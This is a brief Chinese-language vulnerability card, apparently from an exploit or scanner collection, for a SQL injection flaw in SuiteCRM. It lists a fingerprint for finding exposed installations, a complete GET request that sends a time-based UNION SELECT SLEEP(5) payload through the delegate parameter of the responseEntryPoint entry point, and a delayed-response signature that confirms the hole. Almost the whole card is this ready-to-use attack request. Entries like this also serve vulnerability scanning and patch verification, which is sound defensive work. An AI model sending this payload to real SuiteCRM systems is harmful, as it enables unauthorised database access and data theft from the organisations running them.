# SuiteCRMSQL注入漏洞

SuiteCRMSQL ｜ SQL注入 ｜ —
- **指纹**：`title="SuiteCRM"`
- **请求**：`GET /index.php?entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(5);--+-&type=c&response=accept HTTP/1.1`
- **响应特征**：200 响应时间>=5s